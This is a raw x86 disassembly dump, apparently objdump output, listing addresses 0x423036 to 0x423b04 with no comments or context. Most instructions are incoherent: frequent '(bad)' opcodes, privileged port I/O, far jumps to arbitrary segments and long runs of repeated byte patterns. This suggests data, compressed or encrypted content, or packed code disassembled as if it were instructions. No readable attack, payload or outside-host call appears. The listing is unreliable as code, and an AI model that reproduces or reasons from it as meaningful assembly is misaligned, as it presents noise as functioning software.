  423036:	rcr    DWORD PTR [ebp-0x4d43a4a0],cl
  42303c:	pushf  
  42303d:	dec    ecx
  42303e:	cli    
  42303f:	icebp  
  423040:	arpl   WORD PTR [edi],di
  423042:	ret    
  423043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423044:	or     esi,edx
  423046:	push   ss
  423047:	add    al,0x0
	...
  423071:	add    BYTE PTR [eax+eax*2-0x72],ch
  423075:	(bad)  
  423076:	imul   eax,DWORD PTR [eax-0x73],0xac545cca
  42307d:	mov    ebx,0x4315b28
  423082:	mov    WORD PTR [eax-0x72],es
  423085:	aam    0x4c
  423087:	inc    eax
  423088:	jns    0x423046
  42308a:	imul   edi,DWORD PTR [ebx+eax*4],0xffffffb0
  42308e:	pop    esp
  42308f:	and    BYTE PTR [edi-0x3c],ch
  423092:	rcl    ebp,0x9d
  423095:	add    ecx,DWORD PTR [eax+eax*2]
  423098:	inc    esi
  423099:	shl    DWORD PTR ds:0xf69f5a46,0x3f
  4230a0:	push   eax
  4230a1:	add    al,0x73
  4230a3:	pop    ebx
  4230a4:	sbb    DWORD PTR [edi-0x60c8d9de],ebx
  4230aa:	and    esp,DWORD PTR [edx]
  4230ac:	dec    esp
  4230ad:	mov    ebx,0x3a35b48
  4230b2:	in     al,dx
  4230b3:	aas    
  4230b4:	push   cs
  4230b5:	mov    edi,0xc90c4feb
  4230ba:	fcom   QWORD PTR [ebx+0x2c]
  4230bd:	mov    esp,0x3515b28
  4230c2:	or     al,0x40
  4230c4:	push   cs
  4230c5:	ror    edi,0x3f
  4230c8:	or     BYTE PTR [eax+0xc0021dc],dh
  4230ce:	test   DWORD PTR [eax+eax*1+0x63293d86],edx
  4230d5:	into   
	...
  4230fe:	add    BYTE PTR [eax],al
  423100:	push   cs
  423101:	cmp    dh,BYTE PTR [edi+esi*4-0x24]
  423105:	inc    eax
  423106:	jae    0x4230d4
  423108:	call   0x3e2b7059
  42310d:	cmp    bh,0xaf
  423110:	into   
  423111:	sub    BYTE PTR [ebx-0x3f],ah
  423114:	loope  0x42313f
  423116:	outs   dx,BYTE PTR ds:[esi]
  423117:	rcr    dh,0x47
  42311a:	les    edi,FWORD PTR fs:0xd8bafea5
  423121:	aas    
  423122:	dec    ebp
  423123:	cdq    
  423124:	rol    BYTE PTR [esi+0x41],1
  423127:	pushf  
  423128:	scas   eax,DWORD PTR es:[edi]
  423129:	dec    edx
  42312a:	arpl   WORD PTR [edi-0x6f],di
  42312d:	sub    DWORD PTR [ecx-0x74],esi
  423130:	(bad)  
  423131:	aam    0xfc
  423133:	es cmp eax,0x888e6329
  423139:	inc    esi
  42313a:	jae    0x4231b8
  42313c:	repz xor eax,0x95d95c6c
  423142:	add    BYTE PTR [edx],al
  423144:	cmp    eax,0x795d631e
  423149:	dec    ebx
  42314a:	arpl   WORD PTR [ebx+0x78],bx
  42314d:	xor    eax,0xd47d4c6b
  423152:	cld    
  423153:	dec    eax
  423154:	fimul  WORD PTR [esi+0x5f]
  423157:	cmp    ebp,edx
  423159:	mov    esi,DWORD PTR [edx]
  42315b:	jmp    DWORD PTR [ecx+0x3de96c40]
  423161:	lods   al,BYTE PTR ds:[esi]
  423162:	(bad)  
  423163:	cmp    DWORD PTR [eax],eax
	...
  42318d:	add    BYTE PTR [edx-0x56fa93c7],ah
  423193:	dec    esp
  423194:	arpl   WORD PTR [edx],cx
  423196:	xchg   ecx,eax
  423197:	dec    eax
  423198:	arpl   WORD PTR [eax],ax
  42319a:	es pop edi
  42319c:	outs   dx,DWORD PTR ds:[esi]
  42319d:	push   0x3369033a
  4231a2:	test   DWORD PTR [esi+0x58436c60],edi
  4231a8:	jne    0x4231aa
  4231aa:	out    dx,al
  4231ab:	std    
  4231ac:	jo     0x423213
  4231ae:	adc    eax,0xd47461fe
  4231b3:	or     DWORD PTR [esi+0x63],ebx
  4231b6:	cld    
  4231b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231b8:	outs   dx,BYTE PTR ds:[esi]
  4231b9:	ins    BYTE PTR es:[edi],dx
  4231ba:	out    0x57,al
  4231bc:	ja     0x4231be
  4231be:	into   
  4231bf:	std    
  4231c0:	jo     0x423227
  4231c2:	vpunpcklwd ymm6,ymm0,YMMWORD PTR [esp+edx*8+0x9]
  4231c8:	bound  esp,QWORD PTR [ecx-0x25]
  4231cb:	hlt    
  4231cc:	push   ecx
  4231cd:	jb     0x423192
  4231cf:	cwde   
  4231d0:	cld    
  4231d1:	dec    eax
  4231d3:	add    BYTE PTR [ebx+0x69],ch
  4231d6:	popa   
  4231d7:	cmc    
  4231d8:	jo     0x423208
  4231da:	retf   
  4231db:	sti    
  4231dc:	push   0x4f58e200
  4231e1:	je     0x423228
  4231e3:	stos   DWORD PTR es:[edi],eax
  4231e4:	jo     0x423258
  4231e6:	sahf   
  4231e7:	cwde   
  4231e8:	cld    
  4231e9:	jmp    DWORD PTR [edi+0x15744f5e]
  4231ef:	lods   eax,DWORD PTR ds:[esi]
  4231f0:	aas    
  4231f1:	push   0x0
	...
  42321a:	add    BYTE PTR [eax],al
  42321c:	add    eax,0xab003e16
  423221:	pop    esi
  423222:	dec    edi
  423223:	je     0x42327a
  423225:	mov    bl,0x6b
  423227:	dec    ecx
  423228:	add    DWORD PTR [ebx],edx
  42322a:	add    BYTE PTR ds:[ebx+0x45744f5e],ah
  423231:	lods   al,BYTE PTR ds:[esi]
  423232:	jo     0x4232a6
  423234:	es pop edi
  423236:	jmp    0x3e43:0x6f133400
  42323d:	pop    edi
  42323e:	mov    ah,0x4d
  423240:	test   DWORD PTR [edx+0x713f0e04],0xcded71b8
  42324a:	mov    dl,0x46
  42324c:	icebp  
  42324d:	rol    DWORD PTR [eax],0x71
  423250:	(bad)  
  423251:	aad    0xb9
  423253:	pop    esi
  423254:	scas   al,BYTE PTR es:[edi]
  423255:	stos   DWORD PTR es:[edi],eax
  423256:	fisub  WORD PTR [ebx-0x5e]
  423259:	mov    al,ds:0x9b3e3600
  42325e:	sahf   
  42325f:	bound  ebp,QWORD PTR [edx-0x5d9c5bff]
  423265:	push   ss
  423266:	add    DWORD PTR [edx],ebp
  423268:	ds cdq 
  42326a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42326b:	jae    0x423203
  42326d:	cdq    
  42326e:	mov    ch,0x73
  423270:	pushf  
  423271:	or     ebx,DWORD PTR [edi+0xdf6b5e]
  423277:	inc    edi
  423278:	ds cmc 
  42327a:	mov    eax,ds:0xb4df5560
  42327f:	inc    DWORD PTR [eax]
	...
  4232a9:	add    cl,ah
  4232ab:	cdq    
  4232ac:	add    BYTE PTR [ecx+0x69],ah
  4232af:	jmp    0x2601:0x485d629e
  4232b6:	ds in  eax,0x9c
  4232b9:	ins    BYTE PTR es:[edi],dx
  4232ba:	dec    ebp
  4232bb:	xlat   BYTE PTR ds:[ebx]
  4232bc:	mov    ch,0x6c
  4232be:	sbb    eax,0x3e73a72d
  4232c3:	js     0x4232c9
  4232c5:	jno    0x4232ea
  4232c7:	sbb    ch,BYTE PTR [eax+0x485a1ff]
  4232cd:	jno    0x4232f2
  4232cf:	sub    BYTE PTR [edi+0xc40a60],ah
  4232d5:	ds ds xchg esi,eax
  4232d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232d9:	pusha  
  4232da:	or     ah,al
  4232dc:	add    BYTE PTR [ebp+0x3e],al
  4232df:	pop    ebx
  4232e0:	sbb    ch,BYTE PTR [ecx-0x58f1b213]
  4232e6:	(bad)  
  4232e7:	inc    ecx
  4232e8:	pop    ss
  4232e9:	mov    eax,0x3c7d261
  4232ee:	repz sub eax,0x3bcdd728
  4232f4:	stc    
  4232f5:	mov    bh,0xcc
  4232f7:	dec    edx
  4232f8:	out    0x3,eax
  4232fa:	retf   
  4232fb:	dec    ebp
  4232fc:	(bad)  
  4232fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232ff:	mov    ds,WORD PTR [ecx]
  423301:	loop   0x4232a0
  423303:	aas    
  423304:	retf   
  423305:	add    esi,DWORD PTR [ebp+0x5b]
  423308:	mov    ds:0xb43780a2,eax
  42330d:	mov    dh,0x0
	...
  423337:	add    BYTE PTR [ebp+ecx*2+0x39a2b597],bl
  42333e:	rcr    BYTE PTR [edi+0x3e71c9c],1
  423344:	popa   
  423345:	pop    ebx
  423346:	xchg   esp,eax
  423347:	mov    eax,ds:0xa7884265
  42334c:	mov    WORD PTR [esi-0x7c],cs
  42334f:	mov    ch,0x79
  423351:	dec    ebp
  423352:	xchg   BYTE PTR [ecx+0x3843f58],ch
  423358:	dec    ebp
  423359:	dec    esi
  42335a:	mov    WORD PTR [ebp-0x1e8abea4],?
  423360:	pop    ebp
  423361:	aas    
  423362:	add    DWORD PTR [ebx],0x3e
  423365:	pop    ebx
  423366:	out    0x3,eax
  423368:	ds pop ebx
  42336a:	out    0x3,eax
  42336c:	ds pop ebx
  42336e:	out    0x3,eax
  423370:	ds pop ebx
  423372:	out    0x3,eax
  423374:	ds pop ebx
  423376:	out    0x3,eax
  423378:	ds pop ebx
  42337a:	out    0x3,eax
  42337c:	ds pop ebx
  42337e:	out    0x3,eax
  423380:	ds pop ebx
  423382:	add    cl,ch
  423384:	cmp    eax,0x3de9005b
  423389:	pop    ebx
  42338a:	add    cl,ch
  42338c:	cmp    eax,0x3de9005b
  423391:	pop    ebx
  423392:	add    cl,ch
  423394:	cmp    eax,0x3de9005b
  423399:	pop    ebx
  42339a:	add    cl,ch
	...
  4233c4:	add    BYTE PTR [eax],al
  4233c6:	cmp    eax,0x3de9005b
  4233cb:	pop    ebx
  4233cc:	add    cl,ch
  4233ce:	cmp    eax,0x3de9005b
  4233d3:	pop    ebx
  4233d4:	add    cl,ch
  4233d6:	cmp    eax,0x3de9005b
  4233db:	pop    ebx
  4233dc:	add    cl,ch
  4233de:	cmp    eax,0x3de9005b
  4233e3:	pop    ebx
  4233e4:	add    cl,ch
  4233e6:	cmp    eax,0x3de9005b
  4233eb:	pop    ebx
  4233ec:	add    cl,ch
  4233ee:	cmp    eax,0x3de9005b
  4233f3:	pop    ebx
  4233f4:	add    cl,ch
  4233f6:	cmp    eax,0x3de9005b
  4233fb:	pop    ebx
  4233fc:	add    cl,ch
  4233fe:	cmp    eax,0x3de9005b
  423403:	pop    ebx
  423404:	add    cl,ch
  423406:	cmp    eax,0x3de9005b
  42340b:	pop    ebx
  42340c:	add    cl,ch
  42340e:	cmp    eax,0x3de9005b
  423413:	pop    ebx
  423414:	add    cl,ch
  423416:	cmp    eax,0x3de9005b
  42341b:	pop    ebx
  42341c:	add    cl,ch
  42341e:	cmp    eax,0x3de9005b
  423423:	pop    ebx
  423424:	add    BYTE PTR [eax],al
  423426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423427:	pop    esp
	...
  423454:	xchg   edi,eax
  423455:	pop    esp
  423456:	add    BYTE PTR [eax],al
  423458:	xchg   edi,eax
  423459:	pop    esp
  42345a:	add    BYTE PTR [eax],al
  42345c:	addr16 pop esp
  42345e:	add    BYTE PTR [eax],al
  423460:	addr16 pop esp
  423462:	add    BYTE PTR [eax],al
  423464:	push   edi
  423465:	pop    esp
  423466:	add    BYTE PTR [eax],al
  423468:	push   edi
  423469:	pop    esp
  42346a:	add    BYTE PTR [eax],al
  42346c:	addr16 pop esp
  42346e:	add    BYTE PTR [eax],al
  423470:	addr16 pop esp
  423472:	add    BYTE PTR [eax],al
  423474:	push   edi
  423475:	pop    esp
  423476:	add    BYTE PTR [eax],al
  423478:	push   edi
  423479:	pop    esp
  42347a:	add    BYTE PTR [eax],al
  42347c:	daa    
  42347d:	pop    esp
  42347e:	add    BYTE PTR [eax],al
  423480:	daa    
  423481:	pop    esp
  423482:	add    BYTE PTR [eax],al
  423484:	pop    ss
  423485:	pop    esp
  423486:	add    BYTE PTR [eax],al
  423488:	pop    ss
  423489:	pop    esp
  42348a:	add    BYTE PTR [eax],al
  42348c:	daa    
  42348d:	pop    esp
  42348e:	add    BYTE PTR [eax],al
  423490:	daa    
  423491:	pop    esp
  423492:	add    BYTE PTR [eax],al
  423494:	pop    ss
  423495:	pop    esp
  423496:	add    BYTE PTR [eax],al
  423498:	pop    ss
  423499:	pop    esp
  42349a:	add    BYTE PTR [eax],al
  42349c:	out    0x5b,eax
  42349e:	add    BYTE PTR [eax],al
  4234a0:	out    0x5b,eax
  4234a2:	add    BYTE PTR [eax],al
  4234a4:	xlat   BYTE PTR ds:[ebx]
  4234a5:	pop    ebx
  4234a6:	add    BYTE PTR [eax],al
  4234a8:	mov    esp,esp
  4234aa:	jmp    0x4234fd
  4234ac:	lds    edx,FWORD PTR ds:0xe3468a08
  4234b2:	dec    edx
  4234b3:	push   DWORD PTR [ebp+0xc35ab5]
	...
  4234e1:	add    BYTE PTR [ebx-0x1c],ch
  4234e4:	jmp    0x423537
  4234e6:	adc    BYTE PTR [eax],ch
  4234e8:	xor    ecx,ecx
  4234ea:	sbb    ah,ah
  4234ec:	outs   dx,BYTE PTR ds:[esi]
  4234ed:	xor    BYTE PTR [ebp+0x288b0c48],dh
  4234f3:	outs   dx,DWORD PTR ds:[esi]
  4234f4:	mov    DWORD PTR [esi+0x46],eax
  4234f7:	loop   0x42353b
  4234f9:	cld    
  4234fa:	lds    edx,FWORD PTR [eax+0x20]
  4234fd:	mov    edx,DWORD PTR [eax-0x25]
  423500:	cmp    al,0x6b
  423502:	or     bl,BYTE PTR [eax-0x80]
  423505:	aas    
  423506:	add    eax,0x67eb0247
  42350b:	das    
  42350c:	pop    esi
  42350d:	mov    esp,DWORD PTR [ebx+0x2d]
  423510:	ror    esp,0xb
  423513:	in     al,0xeb
  423515:	sub    DWORD PTR [edx+0x76],0xffffff89
  423519:	inc    ebp
  42351a:	inc    esi
  42351b:	loop   0x42355f
  42351d:	loopne 0x4234d4
  42351f:	sbb    eax,0xbaeb8be0
  423524:	add    BYTE PTR [ecx+0x7a],dl
  423527:	in     al,0x52
  423529:	in     al,0xc5
  42352b:	sbb    ah,ah
  42352d:	mov    esi,DWORD PTR [esi+0x53]
  423530:	add    DWORD PTR [ebp+0x36],ecx
  423533:	in     al,0x4a
  423535:	clc    
  423536:	lds    ebp,FWORD PTR [eax]
  423538:	clc    
  423539:	mov    edi,DWORD PTR [edi+esi*2+0x1]
  42353d:	inc    ebp
  42353e:	ss in  al,0x42
  423541:	call   0x8c3a55fb
	...
  42356e:	add    BYTE PTR [eax],al
  423570:	(bad)  
  423571:	jnp    0x423574
  423573:	push   ebp
  423574:	inc    esi
  423575:	in     al,0x52
  423577:	lock mov ch,0x18
  42357a:	clc    
  42357b:	mov    esi,DWORD PTR [esi+0x6f]
  42357e:	add    DWORD PTR [ebp+0x46],ecx
  423581:	in     al,0x4a
  423583:	cld    
  423584:	stc    
  423585:	sbb    ah,dh
  423587:	add    BYTE PTR [esi],bh
  423589:	pop    ebx
  42358a:	add    bl,ch
  42358c:	aaa    
  42358d:	loop   0x4235e1
  42358f:	hlt    
  423590:	mov    ebp,0xb88fe99
  423595:	(bad)  
  423596:	mov    BYTE PTR [ebp-0x5a],al
  423599:	loop   0x4235e5
  42359b:	hlt    
  42359c:	and    ebx,DWORD PTR gs:[eax]
  42359f:	jae    0x4235a7
  4235a1:	loop   0x4235f5
  4235a3:	lock lds ebx,FWORD PTR [ecx+0x1]
  4235a7:	inc    ebp
  4235a8:	ss in  al,0x42
  4235ab:	fcom   QWORD PTR [ebx*2+0x1b3cac68]
  4235b2:	add    BYTE PTR [ebx-0x17b150fd],cl
  4235b8:	push   cs
  4235b9:	pop    esp
  4235ba:	add    BYTE PTR [eax],al
  4235bc:	mov    ebp,0x7e850b97
  4235c1:	dec    eax
  4235c2:	sbb    DWORD PTR [ebx+0x4588c6eb],ecx
  4235c8:	push   esi
  4235c9:	pop    esi
  4235ca:	mov    ch,0xc
  4235cc:	out    dx,al
  4235cd:	jecxz  0x423619
  4235cf:	in     al,dx
  4235d0:	lds    esp,FWORD PTR [edi]
  4235d2:	in     al,dx
  4235d3:	mov    eax,DWORD PTR [eax]
	...
  4235fd:	add    BYTE PTR [ebx-0x31],bh
  423600:	mov    BYTE PTR [esi+ecx*8],al
  423603:	pop    ecx
  423604:	inc    ebx
  423605:	or     BYTE PTR ds:0xe4d8960,dl
  42360b:	fidivr DWORD PTR [esi-0xfe038fc]
  423611:	jmp    0x4235f5
  423613:	mov    eax,eax
  423615:	mov    ebx,DWORD PTR [ebx]
  423617:	xor    cl,al
  423619:	int3   
  42361a:	or     bl,BYTE PTR [edi-0x60fd3335]
  423620:	retf   
  423621:	int3   
  423622:	cli    
  423623:	sahf   
  423624:	retf   
  423625:	int3   
  423626:	mov    esp,edx
  423628:	jmp    0x4235ad
  42362a:	jmp    0xfccd:0xd105e872
  423631:	mov    DWORD PTR [ebx-0x29ba773d],eax
  423637:	sub    ch,al
  423639:	sub    DWORD PTR [ecx+0x7a83fccd],edi
  42363f:	push   esi
  423640:	mov    eax,ds:0x1c31f4
  423645:	push   0x4058e2
  42364a:	lds    ebx,FWORD PTR [edi]
  42364c:	call   0xf4a9c7a2
  423651:	ja     0x423652
  423653:	pop    edx
  423654:	mov    eax,ds:0x1c09f8
  423659:	push   0x3e
  42365b:	inc    ecx
  42365c:	add    BYTE PTR [eax-0x7e],ch
  42365f:	pop    eax
  423660:	inc    eax
	...
  423689:	add    BYTE PTR [eax],al
  42368b:	add    BYTE PTR [ecx+0x67],ch
  42368e:	clc    
  42368f:	ja     0x423690
  423691:	pop    edx
  423692:	xchg   DWORD PTR [ebp+0x66],eax
  423695:	xchg   ebp,eax
  423696:	inc    edx
  423697:	cld    
  423698:	ds pop ebx
  42369a:	add    BYTE PTR [eax],al
  42369c:	push   ebp
  42369d:	arpl   WORD PTR [ecx-0x3e26bdab],cx
  4236a3:	add    edi,eax
  4236a5:	es cld 
  4236a7:	xor    DWORD PTR [ebx+0x5f7307cf],0xffffffe0
  4236ae:	inc    edx
  4236af:	cld    
  4236b0:	mov    ch,0x5f
  4236b2:	or     DWORD PTR [esp+edi*1-0x3aaeffe5],0x26
  4236ba:	call   0xf4a94011
  4236bf:	ja     0x423740
  4236c1:	pop    ebx
  4236c2:	mov    DWORD PTR [ebp-0x6],ecx
  4236c5:	loop   0x4236ca
  4236c7:	(bad)  
  4236c8:	jmp    0x88ab:0xd5003f44
  4236cf:	in     eax,0x83
  4236d1:	cwde   
  4236d2:	retf   
  4236d3:	int3   
  4236d4:	or     ah,BYTE PTR [eax-0x5ffd3335]
  4236da:	retf   
  4236db:	int3   
  4236dc:	cli    
  4236dd:	lahf   
  4236de:	retf   
  4236df:	int3   
  4236e0:	imul   esp,eax,0xffffffeb
  4236e3:	mov    eax,ds:0x3f530e
  4236e8:	jo     0x4236ca
  4236ea:	aas    
  4236eb:	xor    BYTE PTR [ebp+0x3e081e],dh
	...
  423719:	add    BYTE PTR [edi+0x7d5d0823],dh
  42371f:	lahf   
  423720:	retf   
  423721:	int3   
  423722:	sbb    BYTE PTR [edi-0x60853335],0xcb
  423729:	int3   
  42372a:	jmp    0x42370b
  42372c:	jmp    0x4236b9
  42372e:	add    ebx,DWORD PTR [edi+0x50]
  423731:	mov    eax,DWORD PTR [ebx]
  423733:	arpl   WORD PTR [edi-0x1],cx
  423736:	push   ebx
  423737:	(bad)  
  423738:	je     0x42377b
  42373a:	ds cs ror esp,0x8a
  42373f:	lahf   
  423740:	retf   
  423741:	int3   
  423742:	sbb    BYTE PTR [edi-0x60853335],0xcb
  423749:	int3   
  42374a:	jmp    0x42372b
  42374c:	jmp    0x4236d1
  42374e:	sub    ah,BYTE PTR [ebx+0x6a]
  423751:	add    BYTE PTR [ebx+ebx*2+0x1b3cdc68],ah
  423758:	add    bh,bh
  42375a:	dec    ebx
  42375b:	shl    DWORD PTR [ecx+eax*2+0x3e],cl
  42375f:	loop   0x4237a3
  423761:	clc    
  423762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423763:	ret    
  423764:	add    DWORD PTR [eax+0x3e],eax
  423767:	loopne 0x4237ab
  423769:	clc    
  42376a:	outs   dx,BYTE PTR ds:[esi]
  42376b:	ret    
  42376c:	mov    ecx,0x80cbf9ff
  423771:	les    eax,FWORD PTR [esi-0x1e]
  423774:	inc    edx
  423775:	cld    
  423776:	mov    ch,0x1d
  423778:	adc    BYTE PTR [ecx-0x4b],dl
  42377b:	and    eax,0x520c
	...
  4237a8:	lds    edx,FWORD PTR ds:0x25d15008
  4237ae:	cld    
  4237af:	mov    esp,ebx
  4237b1:	sub    eax,0xe06bccc1
  4237b6:	jmp    0x423809
  4237b8:	adc    DWORD PTR ds:0x5b3e00fc,0xe037eb00
  4237c2:	inc    edx
  4237c3:	cld    
  4237c4:	mov    ebp,0x388fe9a
  4237c9:	iret   
  4237ca:	mov    BYTE PTR [ebp-0x6e],cl
  4237cd:	(bad)  
  4237ce:	dec    ebx
  4237cf:	adc    BYTE PTR ds:0x3655896c,cl
  4237d5:	pop    eax
  4237d6:	push   ebx
  4237d7:	cld    
  4237d8:	dec    ecx
  4237d9:	add    eax,0x5f038b02
  4237de:	add    DWORD PTR [ebp+0x6a],ecx
  4237e1:	pop    ebx
  4237e2:	mov    dh,0x11
  4237e4:	and    eax,0x96077399
  4237e9:	pop    ecx
  4237ea:	add    BYTE PTR [eax],al
  4237ec:	rol    BYTE PTR ds:[ebx],0xeb
  4237f0:	outs   dx,BYTE PTR ds:[esi]
  4237f1:	xchg   eax,eax
  4237f3:	mov    ebx,DWORD PTR [ebx+0x2d]
  4237f6:	ror    esp,0xa
  4237f9:	cwde   
  4237fa:	retf   
  4237fb:	int3   
  4237fc:	add    bl,BYTE PTR [eax-0x68053335]
  423802:	retf   
  423803:	int3   
  423804:	mov    edx,esi
  423806:	jmp    0x4237c1
  423808:	ss pop ebx
	...
  423836:	call   0x782b:0x3b8906d6
  42383d:	inc    ecx
  42383e:	ds sub cl,al
  423841:	int3   
  423842:	or     bl,BYTE PTR [eax-0x67fd3335]
  423848:	retf   
  423849:	int3   
  42384a:	cli    
  42384b:	xchg   edi,eax
  42384c:	retf   
  42384d:	int3   
  42384e:	mov    edx,esi
  423850:	jmp    0x4237d5
  423852:	jmp    0x77de:0x4645896b
  423859:	add    al,0x3e
  42385b:	pop    edx
  42385c:	test   BYTE PTR [eax-0x74ffa4c2],cl
  423862:	or     edx,DWORD PTR [ebx-0x77]
  423865:	push   ecx
  423866:	cmp    bl,dh
  423868:	jmp    0x86f7c775
  42386d:	push   ebp
  42386e:	stos   BYTE PTR es:[edi],al
  42386f:	(bad)  
  423870:	inc    edx
  423871:	or     BYTE PTR [ebp-0x476f865],bh
  423877:	retf   0x45c4
  42387a:	mov    bl,BYTE PTR [ebx+0x0]
  42387d:	add    BYTE PTR [esi],bh
  42387f:	mov    dh,0x6
  423881:	mov    ecx,DWORD PTR [ebx]
  423883:	mov    DWORD PTR [eax+0x4ad43fc1],0xfc30b5fc
  42388d:	cmp    ecx,DWORD PTR [ebx]
  42388f:	iret   
  423890:	jo     0x4238d8
  423892:	lds    esp,FWORD PTR [eax]
  423894:	cld    
  423895:	mov    eax,DWORD PTR [ebx]
  423897:	retf   
  423898:	or     al,0xb7
	...
  4238c2:	add    BYTE PTR [eax],al
  4238c4:	xor    bl,BYTE PTR [edi+edi*4]
  4238c7:	cli    
  4238c8:	xor    bl,dh
  4238ca:	stc    
  4238cb:	add    esi,DWORD PTR [ebx+0x3245898d]
  4238d1:	(bad)  
  4238d2:	dec    edx
  4238d3:	lock cmp DWORD PTR [edx],edx
  4238d6:	adc    al,0x41
  4238d8:	mov    edi,0x3e0ffcbc
  4238dd:	pop    ebx
  4238de:	xchg   DWORD PTR [ebp+0x16],edx
  4238e1:	(bad)  
  4238e2:	inc    edx
  4238e3:	or     BYTE PTR [ebp+0x36030c17],dh
  4238e9:	(bad)  
  4238ea:	push   edx
  4238eb:	clc    
  4238ec:	lds    ebx,FWORD PTR [esi+0xf]
  4238ef:	add    edi,DWORD PTR [ebx+0x6b]
  4238f2:	mov    DWORD PTR [ebp+0x36],ecx
  4238f5:	(bad)  
  4238f6:	push   edx
  4238f7:	or     al,0x3d
  4238f9:	ins    BYTE PTR es:[edi],dx
  4238fa:	mov    DWORD PTR [ebp-0x2a],ecx
  4238fd:	rol    DWORD PTR [ebx],cl
  4238ff:	or     ah,ch
  423901:	xrelease mov BYTE PTR [ebp+0x36],dl
  423905:	(bad)  
  423906:	inc    edx
  423907:	or     BYTE PTR ds:0x389041d,bh
  42390d:	push   ebx
  42390e:	out    0x6b,eax
  423910:	mov    cl,0xc9
  423912:	cld    
  423913:	mov    esp,DWORD PTR [ebx+0xbccc127]
  423919:	(bad)  
  42391a:	jmp    0x42389f
  42391c:	stos   BYTE PTR es:[edi],al
  42391d:	jle    0x4238a8
  42391f:	inc    ebp
  423920:	inc    esi
  423921:	aam    0x42
  423923:	in     al,0xb5
  423925:	pop    ss
  423926:	in     al,0x8b
	...
  423950:	add    BYTE PTR [eax],al
  423952:	jmp    0x423912
  423954:	add    BYTE PTR [ecx+0x3a],dl
  423957:	aam    0x52
  423959:	call   0x8c2a5923
  42395e:	mov    dh,0xda
  423960:	(bad)  
  423961:	(bad)  
  423962:	ds aam 0x4a
  423965:	lock mov ebp,0x4100f047
  42396b:	(bad)  
  42396d:	add    BYTE PTR [esi],bh
  42396f:	pop    ebx
  423970:	mov    DWORD PTR [ebp+0x36],edx
  423973:	pop    esi
  423974:	push   ebx
  423975:	lock (bad) 
  423977:	cs loopne 0x423905
  42397a:	jnp    0x423937
  42397c:	cmp    BYTE PTR [eax+0x4e],0x5b
  423980:	or     eax,0x5c1b84
  423985:	add    BYTE PTR [ebx+ebx*2+0x16c5006a],ah
  42398c:	loopne 0x423919
  42398e:	jae    0x4239e3
  423990:	add    DWORD PTR [ecx+0x32],edx
  423993:	sub    eax,0x50f615fd
  423998:	aas    
  423999:	add    bh,al
  42399b:	push   ds
  42399c:	cld    
  42399d:	mov    eax,DWORD PTR [ebx+0x3e3880bb]
  4239a3:	dec    edi
  4239a4:	pop    ss
  4239a5:	mov    ecx,DWORD PTR [ebx+0x465588bb]
  4239ab:	pop    esp
  4239ac:	jns    0x45caf125
  4239b2:	(bad)  
  4239b4:	dec    edx
  4239b5:	or     BYTE PTR [eax],al
	...
  4239df:	add    BYTE PTR ds:0x3891013,bh
  4239e5:	iret   
  4239e6:	call   0xe070ef02
  4239eb:	mov    edi,ebx
  4239ed:	push   edx
  4239ee:	add    DWORD PTR [edx+0x2e],eax
  4239f1:	rol    BYTE PTR [edx-0xc],cl
  4239f4:	lds    edx,FWORD PTR [esi]
  4239f6:	loopne 0x423983
  4239f8:	repz push edx
  4239fa:	add    DWORD PTR [ecx],edx
  4239fc:	mov    bh,0x2e
  4239fe:	in     al,dx
  4239ff:	mov    DWORD PTR [ebx],0x3effffc3
  423a05:	pop    ebx
  423a06:	mov    DWORD PTR [ebp+0x5e],eax
  423a09:	fdiv   QWORD PTR [edi+0x10]
  423a0c:	ds dec edi
  423a0e:	or     eax,0x80bb0b8b
  423a13:	cmp    DWORD PTR [esi],edi
  423a15:	dec    edi
  423a16:	add    eax,0xfec303c7
  423a1b:	(bad)  
  423a1c:	ds pop ebx
  423a1e:	mov    DWORD PTR [ebp+0x32],edx
  423a21:	fdivr  QWORD PTR [ecx]
  423a23:	add    BYTE PTR [edx+0x3245893a],ch
  423a29:	aam    0x7
  423a2b:	sbb    DWORD PTR [edi],0xbe00005b
  423a31:	dec    esi
  423a32:	sbb    al,0x8b
  423a34:	imul   ecx,edi,0xffffff88
  423a37:	add    ah,BYTE PTR [ebx-0x38]
  423a3a:	cld    
  423a3b:	inc    DWORD PTR [ecx-0x5b276d5]
  423a41:	sub    eax,ebp
  423a43:	mov    ch,0x0
	...
  423a6d:	add    bl,dh
  423a6f:	(bad)  
  423a70:	cld    
  423a71:	add    DWORD PTR [edx],0x53
  423a74:	xchg   DWORD PTR [ebp+0x2],eax
  423a77:	mov    ah,0x1b
  423a79:	mov    esi,DWORD PTR [ebx-0x31]
  423a7c:	mov    BYTE PTR [edx],al
  423a7e:	lds    edx,FWORD PTR ds:0x53728d08
  423a84:	add    dl,BYTE PTR [edx-0x4b]
  423a87:	sbb    eax,0xefa650fc
  423a8c:	cli    
  423a8d:	push   DWORD PTR [ecx-0x48f73c25]
  423a93:	sbb    eax,0xcef38bdc
  423a98:	mov    BYTE PTR [ebp+0x7a],dl
  423a9b:	ror    DWORD PTR [esi],1
  423a9d:	mov    edi,ebx
  423a9f:	into   
  423aa0:	add    al,0x42
  423aa3:	rol    BYTE PTR [edx-0xc],cl
  423aa6:	mov    ch,0x15
  423aa8:	in     al,dx
  423aa9:	cmp    DWORD PTR [edi+0x5e],0xffffff87
  423aad:	dec    ebp
  423aae:	bound  esi,QWORD PTR [ebx-0x44ec746c]
  423ab4:	add    dl,0x4a
  423ab7:	rcl    BYTE PTR [edx-0x20],cl
  423aba:	addr16 pop eax
  423abc:	std    
  423abd:	call   DWORD PTR [ecx-0x2d]
  423ac0:	loop   0x423b1f
  423ac2:	jge    0x423a5a
  423ac4:	retf   
  423ac5:	int3   
  423ac6:	jmp    0x423a9b
  423ac8:	jmp    0x423a4d
  423aca:	sub    dl,BYTE PTR [eax+ebp*2-0x10]
  423ace:	cmp    al,0x1b
  423ad0:	add    bh,bh
	...
  423afa:	add    BYTE PTR [eax],al
  423afc:	push   ebx
  423afd:	pop    ebx
  423afe:	js     0x423b41
  423b00:	ds aam 0x42
  423b03:	clc    
  423b04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
